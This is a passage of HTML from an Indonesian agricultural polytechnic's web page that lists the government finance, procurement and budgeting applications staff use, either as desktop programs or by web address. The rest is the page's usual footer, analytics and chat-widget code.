<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">11</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">GPP (Gaji Pemerintah Pusat)</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">12</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">SAIBA (Sistem Akutansi Instansi Berbasis Akrual)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">13</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">SIMAK BMN</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">14</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">SIMAK Persedian</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 98px;">
<td style="width: 9.24069%; height: 98px; border-style: solid; border-color: #000000;">15</td>
<td style="width: 278.154%; height: 98px; border-style: solid; border-color: #000000;" width="511">SIPOKE (Sistem Informasi Program Keungan dan Evaluasi) Perjalanan/Honorarium</td>
<td style="width: 7.52503%; height: 98px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">16</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">SPRINT (SISTEM PENGELOLAAN REKENING TERINTEGRASI)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://sprint.kemenkeu.go.id/rekening/app/#/">https://sprint.kemenkeu.go.id/rekening/app/#/</a></td>
</tr>
<tr style="height: 98px;">
<td style="width: 9.24069%; height: 98px; border-style: solid; border-color: #000000;">17</td>
<td style="width: 278.154%; height: 98px; border-style: solid; border-color: #000000;" width="511">SIMAN (Sistem Informasi Manajemen Aset Negara)</td>
<td style="width: 7.52503%; height: 98px; border-style: solid; border-color: #000000;" width="314"><a href="https://www.djkn.kemenkeu.go.id/websiman/login/pengguna?red=https%3A%2F%2Fwww.djkn.kemenkeu.go.id%2Fwebsiman%2Fdownload%2Fsiman-pengguna-barang">https://www.djkn.kemenkeu.go.id/websiman/login/pengguna?red=https%3A%2F%2Fwww.djkn.kemenkeu.go.id%2Fwebsiman%2Fdownload%2Fsiman-pengguna-barang</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">18</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">E-Monev BAPPENAS (Elektronik Monitoring dan Evaluasi)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://e-monev.bappenas.go.id/2021/">https://e-monev.bappenas.go.id/2021/</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">19</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">SATUDJA (Sistem Aplikasi Terpadu<br />
Direktorat Jenderal Anggaran)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://satudja.kemenkeu.go.id/">https://satudja.kemenkeu.go.id/</a></td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">20</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">SAKTI (Sistem Aplikasi Keuangan Tingkat Instansi)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="https://sakti.kemenkeu.go.id/">https://sakti.kemenkeu.go.id/</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">21</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">SMART DJA (Sistem Monitoring dan Evaluasi Kinerja Terpadu)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="http://monev.anggaran.depkeu.go.id/">http://monev.anggaran.depkeu.go.id/</a></td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">22</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">LPSE (Layanan Pengadaan Secara Elektronik)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="https://lpse.pertanian.go.id/eproc4">https://lpse.pertanian.go.id/eproc4</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">23</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">SIRUP LKPP (Sistem Informasi Rencana Umum Pengadaan</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="https://sirup.lkpp.go.id/">https://sirup.lkpp.go.id/</a></td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">24</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">Cash Management System BRI (CMS BRI)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="https://brivirtualdebit.id/">https://brivirtualdebit.id/</a></td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">25</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">E-SPM (Elektronik Surat Permintaan Pembayaran)</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="https://espm.kemenkeu.go.id/">https://espm.kemenkeu.go.id/</a></td>
</tr>
<tr style="height: 50px;">
<td style="width: 9.24069%; height: 50px; border-style: solid; border-color: #000000;">26</td>
<td style="width: 278.154%; height: 50px; border-style: solid; border-color: #000000;" width="511">SIPEKA (Sistem Informasi Perjanjian Kinerja) BPPSDMP</td>
<td style="width: 7.52503%; height: 50px; border-style: solid; border-color: #000000;" width="314"><a href="http://sicanda.bppsdmp.pertanian.go.id/sipeka/">http://sicanda.bppsdmp.pertanian.go.id/sipeka/</a></td>
</tr>
<tr style="height: 74px;">
<td style="width: 9.24069%; height: 74px; border-style: solid; border-color: #000000;">27</td>
<td style="width: 278.154%; height: 74px; border-style: solid; border-color: #000000;" width="511">ESAKIP (Elektronik-Sistem Akuntabilitas Kinerja Instansi Pemerintah)</td>
<td style="width: 7.52503%; height: 74px; border-style: solid; border-color: #000000;" width="314"><a href="http://esakip.pertanian.go.id/">http://esakip.pertanian.go.id/</a></td>
</tr>
<tr style="height: 26px;">
<td style="width: 9.24069%; height: 26px; border-style: solid; border-color: #000000;">27</td>
<td style="width: 278.154%; height: 26px; border-style: solid; border-color: #000000;" width="511">PIN PPSPM Pengaman SPM</td>
<td style="width: 7.52503%; height: 26px; border-style: solid; border-color: #000000;" width="314">Desktop</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<div class="pvc_clear"></div>
<p id="pvc_stats_618" class="pvc_stats total_only  pvc_load_by_ajax_update" data-element-id="618" style=""><i class="pvc-stats-icon small" aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" version="1.0" viewBox="0 0 502 315" preserveAspectRatio="xMidYMid meet"><g transform="translate(0,332) scale(0.1,-0.1)" fill="" stroke="none"><path d="M2394 3279 l-29 -30 -3 -207 c-2 -182 0 -211 15 -242 39 -76 157 -76 196 0 15 31 17 60 15 243 l-3 209 -33 29 c-26 23 -41 29 -80 29 -41 0 -53 -5 -78 -31z"/><path d="M3085 3251 c-45 -19 -58 -50 -96 -229 -47 -217 -49 -260 -13 -295 52 -53 146 -42 177 20 16 31 87 366 87 410 0 70 -86 122 -155 94z"/><path d="M1751 3234 c-13 -9 -29 -31 -37 -50 -12 -29 -10 -49 21 -204 19 -94 39 -189 45 -210 14 -50 54 -80 110 -80 34 0 48 6 76 34 21 21 34 44 34 59 0 14 -18 113 -40 219 -37 178 -43 195 -70 221 -36 32 -101 37 -139 11z"/><path d="M1163 3073 c-36 -7 -73 -59 -73 -102 0 -56 133 -378 171 -413 34 -32 83 -37 129 -13 70 36 67 87 -16 290 -86 209 -89 214 -129 231 -35 14 -42 15 -82 7z"/><path d="M3689 3066 c-15 -9 -33 -30 -42 -48 -48 -103 -147 -355 -147 -375 0 -98 131 -148 192 -74 13 15 57 108 97 206 80 196 84 226 37 273 -30 30 -99 39 -137 18z"/><path d="M583 2784 c-38 -19 -67 -74 -58 -113 9 -42 211 -354 242 -373 16 -10 45 -18 66 -18 51 0 107 52 107 100 0 39 -1 41 -124 234 -80 126 -108 162 -133 173 -41 17 -61 16 -100 -3z"/><path d="M4250 2784 c-14 -9 -74 -91 -133 -183 -95 -150 -107 -173 -107 -213 0 -55 33 -94 87 -104 67 -13 90 8 211 198 130 202 137 225 78 284 -27 27 -42 34 -72 34 -22 0 -50 -8 -64 -16z"/><path d="M2275 2693 c-553 -48 -1095 -270 -1585 -649 -135 -104 -459 -423 -483 -476 -23 -49 -22 -139 2 -186 73 -142 361 -457 571 -626 285 -228 642 -407 990 -497 242 -63 336 -73 660 -74 310 0 370 5 595 52 535 111 1045 392 1455 803 122 121 250 273 275 326 19 41 19 137 0 174 -41 79 -309 363 -465 492 -447 370 -946 591 -1479 653 -113 14 -422 18 -536 8z m395 -428 c171 -34 330 -124 456 -258 112 -119 167 -219 211 -378 27 -96 24 -300 -5 -401 -72 -255 -236 -447 -474 -557 -132 -62 -201 -76 -368 -76 -167 0 -236 14 -368 76 -213 98 -373 271 -451 485 -162 444 86 934 547 1084 153 49 292 57 452 25z m909 -232 c222 -123 408 -262 593 -441 76 -74 138 -139 138 -144 0 -16 -233 -242 -330 -319 -155 -123 -309 -223 -461 -299 l-81 -41 32 46 c18 26 49 83 70 128 143 306 141 649 -6 957 -25 52 -61 116 -79 142 l-34 47 45 -20 c26 -10 76 -36 113 -56z m-2057 25 c-40 -58 -105 -190 -130 -263 -110 -324 -59 -707 132 -981 25 -35 42 -64 37 -64 -19 0 -241 119 -326 174 -188 122 -406 314 -532 468 l-58 71 108 103 c185 178 428 349 672 473 66 33 121 60 123 61 2 0 -10 -19 -26 -42z"/><path d="M2375 1950 c-198 -44 -350 -190 -395 -379 -18 -76 -8 -221 19 -290 114 -284 457 -406 731 -260 98 52 188 154 231 260 27 69 37 214 19 290 -38 163 -166 304 -326 360 -67 23 -215 33 -279 19z"/></g></svg></i> <img loading="lazy" decoding="async" width="16" height="16" alt="Loading" src="https://pepi.ac.id/wp-content/plugins/page-views-count/ajax-loader-2x.gif" border=0 /></p>
<div class="pvc_clear"></div>
	</div>
</div>
	</div>
</div>
	</div>
		</div>
	</div>
</div>
</div>
<footer class="fl-builder-content fl-builder-content-163 fl-builder-global-templates-locked" data-post-id="163" itemscope="itemscope" itemtype="http://schema.org/WPFooter" data-type="footer"><div class="fl-row fl-row-full-width fl-row-bg-color fl-node-5e1969daa6445" data-node="5e1969daa6445">
	<div class="fl-row-content-wrap">
						<div class="fl-row-content fl-row-fixed-width fl-node-content">
		
<div class="fl-col-group fl-node-5e27a48ec487b" data-node="5e27a48ec487b">
			<div class="fl-col fl-node-5e27a48ec50d2 fl-col-small" data-node="5e27a48ec50d2">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-heading fl-node-5e27a4bdb7cf4" data-node="5e27a4bdb7cf4">
	<div class="fl-module-content fl-node-content">
		<h2 class="fl-heading">
		<a href="https://pepi.ac.id/beranda/" title="pepi" target="_self">
		<span class="fl-heading-text">pepi</span>
		</a>
	</h2>
	</div>
</div>
<div class="fl-module fl-module-rich-text fl-node-5e27a574e8655" data-node="5e27a574e8655">
	<div class="fl-module-content fl-node-content">
		<div class="fl-rich-text">
	<p>Politeknik Enjiniring Pertanian Indonesia merupakan pendidikan tinggi vokasi dibidang mekanisasi pertanian, dibawah Badan Penyuluhan dan Pengembangan SDM Pertanian (BPPSDMP) Kementerian Pertanian</p>
</div>
	</div>
</div>
	</div>
</div>
			<div class="fl-col fl-node-5e27a48ec5128 fl-col-small" data-node="5e27a48ec5128">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-heading fl-node-5e196b6974f09" data-node="5e196b6974f09">
	<div class="fl-module-content fl-node-content">
		<h2 class="fl-heading">
		<span class="fl-heading-text">Hubungi Kami</span>
	</h2>
	</div>
</div>
<div class="fl-module fl-module-icon fl-node-5e1969daa664e" data-node="5e1969daa664e">
	<div class="fl-module-content fl-node-content">
		<div class="fl-icon-wrap">

	<span class="fl-icon">
								<a href="https://goo.gl/maps/BCvmmB6RzKrQQRZU7" target="_self" tabindex="-1" aria-hidden="true" aria-labelledby="fl-icon-text-5e1969daa664e" rel="nofollow" >
							<i class="far fa-map" aria-hidden="true"></i>
				</a>
			</span>

		<div id="fl-icon-text-5e1969daa664e" class="fl-icon-text">
				<a href="https://goo.gl/maps/BCvmmB6RzKrQQRZU7" target="_self" class="fl-icon-text-link fl-icon-text-wrap" rel="nofollow" >
				<p>Jl. Sinarmas Boulevard, Situ Gadung Nomor. 01 , Kec. Pagedangan, Tangerang, Banten 15338</p>
				</a>
			</div>
	
</div>
	</div>
</div>
<div class="fl-module fl-module-icon fl-node-5e1969daa668f" data-node="5e1969daa668f">
	<div class="fl-module-content fl-node-content">
		<div class="fl-icon-wrap">

	<span class="fl-icon">
								<a href="/cdn-cgi/l/email-protection#077762776e2974627577686960477762757366696e6669296068296e63" target="_self" tabindex="-1" aria-hidden="true" aria-labelledby="fl-icon-text-5e1969daa668f">
							<i class="far fa-envelope" aria-hidden="true"></i>
				</a>
			</span>

		<div id="fl-icon-text-5e1969daa668f" class="fl-icon-text">
				<a href="/cdn-cgi/l/email-protection#720217021b5c011700021d1c153202170006131c1b131c5c151d5c1b16" target="_self" class="fl-icon-text-link fl-icon-text-wrap">
				<p><span class="__cf_email__" data-cfemail="91e1f4e1f8bfe2f4e3e1fefff6d1e1f4e3e5f0fff8f0ffbff6febff8f5">[email&#160;protected]</span></p>				</a>
			</div>
	
</div>
	</div>
</div>
<div class="fl-module fl-module-icon fl-node-6167df24052bf" data-node="6167df24052bf">
	<div class="fl-module-content fl-node-content">
		<div class="fl-icon-wrap">

	<span class="fl-icon">
								<a href="/cdn-cgi/l/email-protection#aafecfc6da8a829a989b838a9f9a939d989a9f9a8aeccbd28a829a989b838a9f9a939d989a9f9a8ae2fa8a8c8afdeb908a9a9298988a9b9a9f928a9b999998" target="_self" tabindex="-1" aria-hidden="true" aria-labelledby="fl-icon-text-6167df24052bf">
							<i class="fas fa-phone" aria-hidden="true"></i>
				</a>
			</span>

		<div id="fl-icon-text-6167df24052bf" class="fl-icon-text">
				<a href="/cdn-cgi/l/email-protection#4014252c306068707271696075707977727075706006213860687072716960757079777270757060081060666017017a607078727260717075786071737372" target="_self" class="fl-icon-text-link fl-icon-text-wrap">
				<p>Telp (021) 389389990<br /> HP & WA: 0851-2478-1061</p>
				</a>
			</div>
	
</div>
	</div>
</div>
	</div>
</div>
			<div class="fl-col fl-node-5e27a48ec5176 fl-col-small" data-node="5e27a48ec5176">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-heading fl-node-5e196c372e92c" data-node="5e196c372e92c">
	<div class="fl-module-content fl-node-content">
		<h2 class="fl-heading">
		<span class="fl-heading-text">Layanan Online</span>
	</h2>
	</div>
</div>
<div class="fl-module fl-module-widget fl-node-5e27a50d9c35c menufooter" data-node="5e27a50d9c35c">
	<div class="fl-module-content fl-node-content">
		<div class="fl-widget">
<div class="widget widget_nav_menu"><div class="menu-menu-aplikasi-container"><ul id="menu-menu-aplikasi" class="menu"><li id="menu-item-1113" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1113"><a href="http://pmb.pepi.ac.id/">PMB PEPI Online</a></li>
<li id="menu-item-1139" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1139"><a href="https://pepi.siakadcloud.com/gate/login">SIAKAD</a></li>
<li id="menu-item-1114" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1114"><a href="http://ikm.pertanian.go.id/?u=DU">SKM Online</a></li>
<li id="menu-item-1261" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1261"><a href="http://pepi.ppid.pertanian.go.id/">Portal PPID</a></li>
<li id="menu-item-1143" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1143"><a href="http://114.199.84.132/auth/login">Sister</a></li>
<li id="menu-item-557" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-557"><a href="https://pepi.ac.id/e-journal/">e-Journal</a></li>
<li id="menu-item-556" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-556"><a href="https://pepi.ac.id/e-repository/">e-Repository</a></li>
<li id="menu-item-1141" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1141"><a href="http://sijamu.bppsdmp.pertanian.go.id/">SiJAMU</a></li>
<li id="menu-item-552" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-552"><a href="https://pepi.ac.id/e-complaint/">e-Complaint</a></li>
</ul></div></div></div>
	</div>
</div>
	</div>
</div>
			<div class="fl-col fl-node-5e27a48ec51c3 fl-col-small" data-node="5e27a48ec51c3">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-heading fl-node-5e196b33b138f" data-node="5e196b33b138f">
	<div class="fl-module-content fl-node-content">
		<h2 class="fl-heading">
		<span class="fl-heading-text">Berlangganan Artikel </span>
	</h2>
	</div>
</div>
<div class="fl-module fl-module-rich-text fl-node-5e27a49d7da70" data-node="5e27a49d7da70">
	<div class="fl-module-content fl-node-content">
		<div class="fl-rich-text">
	<p>Masukkan email anda untuk mendapatkan notifikasi ketika ada pembaharuan artikel dari kami.</p>
<p><div class="emaillist" id="es_form_f1-n1"><form action="/kumpulan-aplikasi-online/#es_form_f1-n1" method="post" class="es_subscription_form es_shortcode_form  es_ajax_subscription_form" id="es_subscription_form_6a1c31819f5f7" data-source="ig-es" data-form-id="1"><div class="es-field-wrap ig-es-form-field"><label class="es-field-label">Email*<br /><input class="es_required_field es_txt_email ig_es_form_field_email ig-es-form-input" type="email" name="esfpx_email" value="" placeholder="" required="required" /></label></div><input type="hidden" name="esfpx_lists[]" value="aee8fa78fad3" /><input type="hidden" name="esfpx_form_id" value="1" /><input type="hidden" name="es" value="subscribe" />
			<input type="hidden" name="esfpx_es_form_identifier" value="f1-n1" />
			<input type="hidden" name="esfpx_es_email_page" value="618" />
			<input type="hidden" name="esfpx_es_email_page_url" value="https://pepi.ac.id/kumpulan-aplikasi-online/" />
			<input type="hidden" name="esfpx_status" value="Unconfirmed" />
			<input type="hidden" name="esfpx_es-subscribe" id="es-subscribe-6a1c31819f5f7" value="e92541dde6" />
			<label style="position:absolute;top:-99999px;left:-99999px;z-index:-99;" aria-hidden="true"><span hidden>Please leave this field empty.</span><input type="email" name="esfpx_es_hp_email" class="es_required_field" tabindex="-1" autocomplete="-1" value="" /></label><input type="submit" name="submit" class="es_subscription_form_submit es_submit_button es_textbox_button" id="es_subscription_form_submit_6a1c31819f5f7" value="Subscribe" /><span class="es_spinner_image" id="spinner-image"><img decoding="async" src="https://pepi.ac.id/wp-content/plugins/email-subscribers/lite/public/images/spinner.gif" alt="Loading" /></span></form><span class="es_subscription_message " id="es_subscription_message_6a1c31819f5f7" role="alert" aria-live="assertive"></span></div></p>
</div>
	</div>
</div>
	</div>
</div>
			<div class="fl-col fl-node-60f24c5748dd1 fl-col-small" data-node="60f24c5748dd1">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-map fl-node-60b1c213e6251" data-node="60b1c213e6251">
	<div class="fl-module-content fl-node-content">
		<div class="fl-map">
	<iframe src="https://www.google.com/maps/embed/v1/place?q=Jl.+Sinarmas+Boulevard%2C+Situ+Gadung+Nomor.+01+%2C+Kec.+Pagedangan%2C+Tangerang%2C+Banten+15338&key=AIzaSyD09zQ9PNDNNy9TadMuzRV_UsPUoWKntt8"></iframe></div>
	</div>
</div>
<div class="fl-module fl-module-html fl-node-5fcf64340e15d" data-node="5fcf64340e15d">
	<div class="fl-module-content fl-node-content">
		<div class="fl-html">
	 <!-- Histats.com  (div with counter) --><div id="histats_counter"></div>
<!-- Histats.com  START  (aync)-->
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript">var _Hasync= _Hasync|| [];
_Hasync.push(['Histats.start', '1,4489232,4,30,130,80,00011011']);
_Hasync.push(['Histats.fasi', '1']);
_Hasync.push(['Histats.track_hits', '']);
(function() {
var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
hs.src = ('//s10.histats.com/js15_as.js');
(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
})();</script>
<noscript><a href="/" target="_blank"><img decoding="async"  src="//sstatic1.histats.com/0.gif?4489232&101" alt="" border="0"></a></noscript>
<!-- Histats.com  END  --></div>
	</div>
</div>
	</div>
</div>
	</div>

<div class="fl-col-group fl-node-60b0b159367bf" data-node="60b0b159367bf">
			<div class="fl-col fl-node-60b0b15936863" data-node="60b0b15936863">
	<div class="fl-col-content fl-node-content">
	<div class="fl-module fl-module-rich-text fl-node-5fcf753426460" data-node="5fcf753426460">
	<div class="fl-module-content fl-node-content">
		<div class="fl-rich-text">
	<p>Copyright ©2026 Politeknik Enjiniring Pertanian Indonesia</p>
</div>
	</div>
</div>
	</div>
</div>
	</div>
		</div>
	</div>
</div>
</footer>
</div><!-- #page we need this extra closing tag here -->

<script type="speculationrules">
{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/vsstem/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
</script>
<div id="glt-translate-trigger"><span class="notranslate">Translate »</span></div><div id="glt-toolbar"></div><div id="flags" style="display:none" class="size16"><ul id="sortable" class="ui-sortable"><li id="Arabic"><a href="#" title="Arabic" class="nturl notranslate ar flag Arabic"></a></li><li id="English"><a href="#" title="English" class="nturl notranslate en flag united-states"></a></li><li id="Japanese"><a href="#" title="Japanese" class="nturl notranslate ja flag Japanese"></a></li><li id="Malay"><a href="#" title="Malay" class="nturl notranslate ms flag Malay"></a></li></ul></div><div id='glt-footer'><div id="google_language_translator" class="default-language-en"></div></div><script>function GoogleLanguageTranslatorInit() { new google.translate.TranslateElement({pageLanguage: 'en', includedLanguages:'ar,en,ja,ms', layout: google.translate.TranslateElement.InlineLayout.HORIZONTAL, autoDisplay: false}, 'google_language_translator');}</script><script type="text/javascript">
        jQuery(function(){
        var arrLiveStats=[];
        var WSM_PREFIX="wsm";
		
        jQuery(".if-js-closed").removeClass("if-js-closed").addClass("closed");
                var wsmFnSiteLiveStats=function(){
                           jQuery.ajax({
                               type: "POST",
                               url: wsm_ajaxObject.ajax_url,
                               data: { action: 'liveSiteStats', requests: JSON.stringify(arrLiveStats), r: Math.random() }
                           }).done(function( strResponse ) {
                                if(strResponse!="No"){
                                    arrResponse=JSON.parse(strResponse);
                                    jQuery.each(arrResponse, function(key,value){
                                    
                                        $element= document.getElementById(key);
                                        oldValue=parseInt($element.getAttribute("data-value").replace(/,/g, ""));
                                        diff=parseInt(value.replace(/,/g, ""))-oldValue;
                                        $class="";
                                        
                                        if(diff>=0){
                                            diff="+"+diff;
                                        }else{
                                            $class="wmcRedBack";
                                        }

                                        $element.setAttribute("data-value",value);
                                        $element.innerHTML=diff;
                                        jQuery("#"+key).addClass($class).show().siblings(".wsmH2Number").text(value);
                                        
                                        if(key=="SiteUserOnline")
                                        {
                                            var onlineUserCnt = arrResponse.wsmSiteUserOnline;
                                            if(jQuery("#wsmSiteUserOnline").length)
                                            {
                                                jQuery("#wsmSiteUserOnline").attr("data-value",onlineUserCnt);   jQuery("#wsmSiteUserOnline").next(".wsmH2Number").html("<a target=\"_blank\" href=\"?page=wsm_traffic&subPage=UsersOnline&subTab=summary\">"+onlineUserCnt+"</a>");
                                            }
                                        }
                                    });
                                    setTimeout(function() {
                                        jQuery.each(arrResponse, function(key,value){
                                            jQuery("#"+key).removeClass("wmcRedBack").hide();
                                        });
                                    }, 1500);
                                }
                           });
                       }
                       if(arrLiveStats.length>0){
                          setInterval(wsmFnSiteLiveStats, 10000);
                       }});
        </script>
<div class="joinchat joinchat--right" data-settings='{"telephone":"6285124781061","mobile_only":false,"button_delay":3,"whatsapp_web":true,"qr":false,"message_views":2,"message_delay":10,"message_badge":false,"message_send":"Selamat datang di layanan informasi Politeknik Enjiniring Pertanian Indonesia (PEPI)\n.\nSesuai UU no. 14 tahun 2008 tentang Keterbukaan Informasi Publik, Mohon di isi data pemohon informasi berikut ini :\n\nNama :\nAlamat :\nPekerjaan :\nNo Tlp :\nEmail :\n\nInformasi yg diperlukan:\n\nAlasan permohonan informasi :","message_hash":"7dac37ad"}'>
	<div class="joinchat__button">
		<div class="joinchat__button__open"></div>
											<div class="joinchat__button__sendtext">Open chat</div>
						<svg class="joinchat__button__send" width="60" height="60" viewbox="0 0 400 400" stroke-linecap="round" stroke-width="33">
				<path class="joinchat_svg__plain" d="M168.83 200.504H79.218L33.04 44.284a1 1 0 0 1 1.386-1.188L365.083 199.04a1 1 0 0 1 .003 1.808L34.432 357.903a1 1 0 0 1-1.388-1.187l29.42-99.427"/>
				<path class="joinchat_svg__chat" d="M318.087 318.087c-52.982 52.982-132.708 62.922-195.725 29.82l-80.449 10.18 10.358-80.112C18.956 214.905 28.836 134.99 81.913 81.913c65.218-65.217 170.956-65.217 236.174 0 42.661 42.661 57.416 102.661 44.265 157.316"/>
			</svg>
										<div class="joinchat__tooltip"><div>Perlu Bantuan?</div></div>
					</div>
			<div class="joinchat__box">
			<div class="joinchat__header">
									<svg class="joinchat__wa" width="120" height="28" viewBox="0 0 120 28"><title>WhatsApp</title><path d="M117.2 17c0 .4-.2.7-.4 1-.1.3-.4.5-.7.7l-1 .2c-.5 0-.9 0-1.2-.2l-.7-.7a3 3 0 0 1-.4-1 5.4 5.4 0 0 1 0-2.3c0-.4.2-.7.4-1l.7-.7a2 2 0 0 1 1.1-.3 2 2 0 0 1 1.8 1l.4 1a5.3 5.3 0 0 1 0 2.3zm2.5-3c-.1-.7-.4-1.3-.8-1.7a4 4 0 0 0-1.3-1.2c-.6-.3-1.3-.4-2-.4-.6 0-1.2.1-1.7.4a3 3 0 0 0-1.2 1.1V11H110v13h2.7v-4.5c.4.4.8.8 1.3 1 .5.3 1 .4 1.6.4a4 4 0 0 0 3.2-1.5c.4-.5.7-1 .8-1.6.2-.6.3-1.2.3-1.9s0-1.3-.3-2zm-13.1 3c0 .4-.2.7-.4 1l-.7.7-1.1.2c-.4 0-.8 0-1-.2-.4-.2-.6-.4-.8-.7a3 3 0 0 1-.4-1 5.4 5.4 0 0 1 0-2.3c0-.4.2-.7.4-1 .1-.3.4-.5.7-.7a2 2 0 0 1 1-.3 2 2 0 0 1 1.9 1l.4 1a5.4 5.4 0 0 1 0 2.3zm1.7-4.7a4 4 0 0 0-3.3-1.6c-.6 0-1.2.1-1.7.4a3 3 0 0 0-1.2 1.1V11h-2.6v13h2.7v-4.5c.3.4.7.8 1.2 1 .6.3 1.1.4 1.7.4a4 4 0 0 0 3.2-1.5c.4-.5.6-1 .8-1.6.2-.6.3-1.2.3-1.9s-.1-1.3-.3-2c-.2-.6-.4-1.2-.8-1.6zm-17.5 3.2l1.7-5 1.7 5h-3.4zm.2-8.2l-5 13.4h3l1-3h5l1 3h3L94 7.3h-3zm-5.3 9.1l-.6-.8-1-.5a11.6 11.6 0 0 0-2.3-.5l-1-.3a2 2 0 0 1-.6-.3.7.7 0 0 1-.3-.6c0-.2 0-.4.2-.5l.3-.3h.5l.5-.1c.5 0 .9 0 1.2.3.4.1.6.5.6 1h2.5c0-.6-.2-1.1-.4-1.5a3 3 0 0 0-1-1 4 4 0 0 0-1.3-.5 7.7 7.7 0 0 0-3 0c-.6.1-1 .3-1.4.5l-1 1a3 3 0 0 0-.4 1.5 2 2 0 0 0 1 1.8l1 .5 1.1.3 2.2.6c.6.2.8.5.8 1l-.1.5-.4.4a2 2 0 0 1-.6.2 2.8 2.8 0 0 1-1.4 0 2 2 0 0 1-.6-.3l-.5-.5-.2-.8H77c0 .7.2 1.2.5 1.6.2.5.6.8 1 1 .4.3.9.5 1.4.6a8 8 0 0 0 3.3 0c.5 0 1-.2 1.4-.5a3 3 0 0 0 1-1c.3-.5.4-1 .4-1.6 0-.5 0-.9-.3-1.2zM74.7 8h-2.6v3h-1.7v1.7h1.7v5.8c0 .5 0 .9.2 1.2l.7.7 1 .3a7.8 7.8 0 0 0 2 0h.7v-2.1a3.4 3.4 0 0 1-.8 0l-1-.1-.2-1v-4.8h2V11h-2V8zm-7.6 9v.5l-.3.8-.7.6c-.2.2-.7.2-1.2.2h-.6l-.5-.2a1 1 0 0 